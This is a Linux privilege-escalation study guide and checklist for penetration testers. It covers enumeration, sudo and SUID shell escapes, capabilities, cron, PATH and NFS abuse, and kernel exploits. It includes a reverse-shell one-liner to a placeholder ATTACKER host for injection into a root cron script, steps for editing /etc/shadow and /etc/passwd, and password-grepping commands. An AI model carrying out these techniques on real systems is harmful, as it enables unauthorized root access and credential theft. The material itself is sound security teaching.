# Introduction

Privilege escalation is a **process**, not a single exploit. There are no universal techniques that work everywhere. The success of privilege escalation depends on multiple system-specific factors such as:

- Kernel version
    
- Installed applications
    
- User permissions
    
- Misconfigurations
    
- Enabled services
    

In real-world penetration testing, gaining **initial access** rarely provides administrative privileges. Privilege escalation allows an attacker to elevate their access and fully compromise the system.

---

# What is Privilege Escalation?

**Privilege escalation** is the act of exploiting a vulnerability, design flaw, or misconfiguration to gain higher-level permissions than originally granted.

### Types

- **Vertical escalation**: User → root/admin
    
- **Horizontal escalation**: User → another user with more privileges
    

---

# Why Privilege Escalation is Important

Achieving higher privileges allows an attacker to:

- Reset or steal passwords
    
- Access protected data
    
- Modify system configurations
    
- Maintain persistence
    
- Add or modify users
    
- Execute unrestricted administrative commands
    

---

# Enumeration (Most Important Phase)

Enumeration is required **after initial access**, not just before exploitation. Always assume more attack paths exist.

---

## System Information Enumeration

### `hostname`

Identifies the system name. Can reveal the system role.

```bash
hostname
```

Example:

```
SQL-PROD-01
```

---

### `uname -a`

Displays kernel version and architecture.

```bash
uname -a
```

Used to search for kernel exploits.

---

### `/proc/version`

Shows kernel details and compiler information.

```bash
cat /proc/version
```

---

### `/etc/issue`

Identifies OS distribution.

```bash
cat /etc/issue
```

---

## Process Enumeration

### `ps`

View running processes.

```bash
ps
ps -A
ps aux
ps axjf
```

Look for:

- Root-owned processes
    
- Custom scripts
    
- Services running as root
    

---

## Environment Variables

### `env`

Displays environment variables.

```bash
env
```

Check:

- PATH hijacking opportunities
    
- Available interpreters (python, perl, gcc)
    

---

## Sudo Permissions

### `sudo -l`

Lists allowed sudo commands.

```bash
sudo -l
```

If a command is allowed, check it on **GTFOBins**.

---

## File and User Enumeration

### `ls -la`

Always use `-la` to find hidden files.

```bash
ls -la
```

---

### `id`

Shows user and group information.

```bash
id
id username
```

---

### `/etc/passwd`

Lists users on the system.

```bash
cat /etc/passwd
```

Extract usernames:

```bash
cut -d ":" -f 1 /etc/passwd
```

Find real users:

```bash
grep home /etc/passwd
```

---

### `history`

May contain passwords or sensitive commands.

```bash
history
```

---

## Network Enumeration

### Interfaces

```bash
ifconfig
ip route
```

Used to identify pivoting opportunities.

---

### `netstat`

Check open ports and connections.

```bash
netstat -a
netstat -l
netstat -ano
netstat -tp
```

Look for:

- Internal services
    
- Root-owned listeners
    
- Unexpected network activity
    

---

## File Discovery with `find`

### Common Finds

```bash
find / -name flag.txt 2>/dev/null
find / -type f -perm 0777 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Writable Directories

```bash
find / -writable -type d 2>/dev/null
```

### Development Tools

```bash
find / -name python*
find / -name gcc*
```

---

# Automated Enumeration Tools

Used to save time (never rely on only one):

- LinPEAS
    
- LinEnum
    
- Linux Exploit Suggester
    
- Linux Smart Enumeration
    
- Linux Priv Checker
    

---

# Privilege Escalation Techniques

---
## 1. Kernel Exploitation (Kernel-Level Privilege Escalation)

### What is the Kernel?

The **Linux kernel** is the core of the operating system. It controls:

- Memory
    
- CPU scheduling
    
- Hardware access
    
- Process permissions
    

The kernel **always runs as root**.  
If you compromise the kernel, you **become root**.

---

### Why Kernel Exploits Work

Kernel exploits take advantage of:

- Outdated kernels
    
- Vulnerable system calls
    
- Race conditions
    
- Memory corruption bugs
    

Since user-space applications rely on the kernel, a flaw here allows **direct privilege escalation**.

---

### When Kernel Exploits Are Viable

Kernel exploits are typically used when:

- No sudo access exists
    
- No SUID binaries are exploitable
    
- System is unpatched or legacy
    
- CTF or lab environment
    

They are **last-resort techniques** in real pentests.

---

### Enumeration for Kernel Exploits

```bash
uname -a
cat /proc/version
```

Key things to note:

- Kernel version
    
- Architecture (x86_64, i686)
    
- Distribution
    
- Compiler version
    

---

### Finding Exploits

Search using:

- Google
    
- CVE Details
    
- exploit-db
    
- searchsploit
    
- Linux Exploit Suggester (LES)
    

Example:

```bash
searchsploit linux kernel 4.4
```

---

### Execution Flow

1. Transfer exploit to target
    
2. Compile if needed
    
3. Run exploit
    
4. Kernel bug triggers
    
5. Privilege escalates to root
    

---

### Risks

- System crash
    
- Kernel panic
    
- Data corruption
    

**Never use blindly in production pentests.**

---

## 2. Sudo-Based Privilege Escalation

### What is sudo?

`sudo` allows a user to run specific commands as root.

Admins often allow **limited sudo access**, but mistakes happen.

---

### Enumeration

```bash
sudo -l
```

This shows:

- Allowed commands
    
- Whether a password is required
    
- Environment variables preserved
    

---

### Why sudo Escalation Works

Many binaries can:

- Execute shell commands
    
- Spawn interactive shells
    
- Read/write sensitive files
    
- Load external libraries
    

Even if the binary itself is safe, **its features may not be**.

---

### GTFOBins

GTFOBins documents **known abuse techniques** for binaries.

Examples:

- vim
    
- less
    
- find
    
- tar
    
- awk
    
- python
    
- nmap
    

---

### Example: sudo vim

```bash
sudo vim
```

Inside vim:

```vim
:!/bin/bash
```

You now have a root shell.

---

### LD_PRELOAD Exploitation (Advanced sudo)

#### What is LD_PRELOAD?

`LD_PRELOAD` forces a program to load a shared library **before anything else**.

If run as root → code executes as root.

---

#### Conditions Required

- sudo allows the binary
    
- `env_keep+=LD_PRELOAD` enabled
    
- Binary does not drop privileges
    

---

#### Why It Works

The dynamic linker loads attacker-controlled code **before main() executes**.

---

#### Result

- Root shell
    
- Full control
    

This is a **high-impact misconfiguration**.

---

## 3. SUID (Set User ID) Exploitation

### What is SUID?

SUID allows a binary to execute with the **owner’s privileges**, not the user’s.

Most SUID binaries are owned by **root**.

---

### Why SUID Is Dangerous

If a SUID binary:

- Allows file editing
    
- Executes commands
    
- Loads plugins
    
- Spawns shells
    

It can be abused to escalate privileges.

---

### Enumeration

```bash
find / -perm -04000 -type f 2>/dev/null
```

---

### Typical Exploitable SUID Binaries

- nano
    
- vim
    
- find
    
- cp
    
- less
    
- bash (rare)
    
- custom scripts
    

---

### Example: SUID nano

If nano is SUID-root:

```bash
nano /etc/shadow
```

You can:

- Read password hashes
    
- Modify system files
    
- Add root users
    

---

### Adding a Root User (Classic Technique)

1. Generate password hash
    
2. Edit `/etc/passwd`
    
3. Add user with UID 0
    
4. Switch user
    

This avoids password cracking entirely.

---

### Why This Works

Linux trusts file permissions.  
If you can write system authentication files as root → full compromise.

---

## 4. Linux Capabilities Exploitation

### What are Capabilities?

Capabilities split root privileges into **fine-grained permissions**.

Examples:

- cap_net_bind_service
    
- cap_setuid
    
- cap_sys_admin
    

---

### Why Capabilities Exist

To avoid giving full root access for:

- Network tools
    
- Debuggers
    
- Monitoring software
    

---

### Enumeration

```bash
getcap -r / 2>/dev/null
```

---

### Why This Is Dangerous

Some binaries with capabilities can:

- Change UID
    
- Spawn shells
    
- Execute commands
    

Even without SUID.

---

### Example: vim with cap_setuid

```bash
vim -c ':!/bin/bash'
```

The shell inherits elevated privileges.

---

### Why This Works

Capabilities are applied **at runtime**.  
If the binary allows command execution, it inherits the capability.

---

## 5. Cron Job Exploitation

### What is Cron?

Cron schedules tasks to run automatically.

Cron jobs often run as:

- root
    
- service accounts
    

---

### Why Cron Jobs Are Dangerous

If:

- Script is writable
    
- Path is not absolute
    
- Script is deleted but cron remains
    

You can inject malicious code.

---

### Enumeration

```bash
cat /etc/crontab
ls -la /etc/cron.*
```

---

### Writable Script Exploit

If root runs:

```bash
* * * * * root /opt/backup.sh
```

And you can edit `backup.sh`, insert:

```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

---

### PATH-Based Cron Exploit

If cron runs:

```bash
antivirus.sh
```

Without absolute path:

- Create `antivirus.sh` in writable PATH
    
- Cron executes your script as root
    

---

### Why This Works

Cron blindly trusts paths and scripts.  
Poor maintenance creates privilege escalation.

---

## 6. PATH Hijacking

### What is PATH?

PATH tells Linux where to search for executables.

```bash
echo $PATH
```

---

### Why PATH Hijacking Works

If:

- A privileged binary executes a command without absolute path
    
- You control a directory in PATH
    

You can replace the command.

---

### Example

SUID binary executes:

```c
system("ls");
```

Linux searches PATH for `ls`.

---

### Exploitation Steps

1. Add writable directory to PATH
    
2. Create fake binary
    
3. Execute vulnerable program
    
4. Fake binary runs as root
    

---

### Why This Is Realistic

Many custom scripts:

- Forget absolute paths
    
- Trust environment variables
    

---

## 7. NFS (Network File System) Exploitation

### What is NFS?

NFS allows remote file sharing.

Config stored in:

```bash
/etc/exports
```

---

### no_root_squash Explained

By default:

- Root becomes `nfsnobody`
    

With `no_root_squash`:

- Root remains root
    

---

### Why This Is Dangerous

If share is writable:

- You can create SUID binaries remotely
    
- Execute them locally as root
    

---

### Exploitation Flow

1. Mount NFS share
    
2. Create SUID root shell
    
3. Execute on target
    
4. Root access gained
    

---

### Why This Works

NFS trusts remote root.  
This violates local security boundaries.

---

# Final Mental Model (Very Important)

Privilege escalation succeeds because of:

- Trust assumptions
    
- Misconfigurations
    
- Convenience over security
    
- Poor maintenance
    

**Linux does exactly what it’s told to do.**

---

# Recommended Practice Order

1. Enumeration
    
2. Sudo
    
3. SUID
    
4. Capabilities
    
5. Cron
    
6. PATH
    
7. NFS
    
8. Kernel exploits
    
---
# Personal Linux Privilege Escalation Checklist

## 0. Pre-Flight (Stabilize Access)

- Upgrade shell
    
- Confirm user context
    
- Avoid noisy actions
    

```bash
whoami
id
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 1. System & Kernel Enumeration

**Goal:** Identify kernel-level escalation possibilities

```bash
hostname
uname -a
cat /proc/version
cat /etc/issue
arch
```

✔ Note:

- Kernel version
    
- OS distribution
    
- Architecture
    

---

## 2. User & Group Enumeration

**Goal:** Understand permission boundaries

```bash
id
groups
who
w
```

Check other users:

```bash
cut -d ":" -f 1 /etc/passwd
grep home /etc/passwd
```

---

## 3. Sudo Privileges (Highest Priority)

**Goal:** Abuse misconfigured sudo rules

```bash
sudo -l
```

If ANY binary is allowed:

- Check GTFOBins
    
- Test for shell escapes
    
- Test file read/write abuse
    
- Check `env_keep`
    

High-value checks:

- vim
    
- less
    
- find
    
- tar
    
- awk
    
- python
    
- nmap
    

---

## 4. Environment Variables

**Goal:** Detect PATH and LD_PRELOAD abuse

```bash
env
echo $PATH
```

Questions:

- Is PATH writable?
    
- Can PATH be modified?
    
- Is LD_PRELOAD preserved by sudo?
    

---

## 5. SUID Binary Enumeration

**Goal:** Find root-owned executables with unsafe behavior

```bash
find / -perm -04000 -type f 2>/dev/null
```

Check each binary on GTFOBins:

- Shell escape?
    
- File edit?
    
- Command execution?
    

High-risk binaries:

- nano
    
- vim
    
- find
    
- cp
    
- bash
    
- python
    

---

## 6. Linux Capabilities

**Goal:** Identify fine-grained privilege leaks

```bash
getcap -r / 2>/dev/null
```

Focus on:

- cap_setuid
    
- cap_setgid
    
- cap_sys_admin
    
- cap_dac_read_search
    

If binary allows shell execution → exploit

---

## 7. Cron Jobs

**Goal:** Hijack scheduled root execution

```bash
cat /etc/crontab
ls -la /etc/cron.*
```

Check:

- Writable scripts
    
- Missing scripts
    
- Relative paths
    
- Wildcards
    

If writable:

- Inject reverse shell
    
- Wait for execution
    

---

## 8. Writable Files & Directories

**Goal:** Detect unsafe permissions

```bash
find / -writable -type d 2>/dev/null
find / -perm -o w -type f 2>/dev/null
```

Focus on:

- /etc
    
- /opt
    
- /usr/local
    
- custom app folders
    

---

## 9. PATH Hijacking

**Goal:** Replace executed binaries

```bash
echo $PATH
```

If writable directory exists:

```bash
export PATH=/tmp:$PATH
```

Check for:

- SUID binaries
    
- Root scripts
    
- Cron jobs using relative paths
    

---

## 10. Network & Services

**Goal:** Identify pivoting and misconfigurations

```bash
ifconfig
ip route
netstat -tulpn
```

Look for:

- Root-owned listeners
    
- Local-only services
    
- Backup services
    
- Admin interfaces
    

---

## 11. NFS & Shared Resources

**Goal:** Abuse no_root_squash

```bash
cat /etc/exports
showmount -e localhost
```

Check for:

- no_root_squash
    
- Writable shares
    

---

## 12. Credentials & Secrets

**Goal:** Steal or reuse credentials

```bash
history
grep -R "password" / 2>/dev/null
```

Check:

- .bash_history
    
- config files
    
- scripts
    
- backup files
    

---

## 13. Kernel Exploits (LAST RESORT)

**Goal:** Exploit unpatched kernels

```bash
uname -a
searchsploit linux kernel
```

Only attempt if:

- No misconfigurations found
    
- System allows instability
    
- You understand the exploit
    

---

## 14. Exploit Chaining Review

Before exploiting, ask:

- Can I chain two small findings?
    
- Is there a cleaner path?
    
- Can I avoid kernel exploits?
    

---

## 15. Post-Escalation Validation

Confirm root:

```bash
whoami
id
```

Validate access:

- /etc/shadow
    
- /root
    
- system configs
    

---

## 16. Cleanup (Real Pentests Only)

- Remove payloads
    
- Restore modified files
    
- Document everything
    

---

## Mental Rules (Never Break These)

- Enumerate before exploiting
    
- Prefer misconfigurations
    
- Avoid kernel exploits unless required
    
- One clean root shell is enough
    
- Document every step
    

---

## How to Use This Checklist

- Print it
    
- Put it in your notes
    
- Convert to markdown
    
- Follow top-to-bottom every time
    
- Never skip steps
    

---
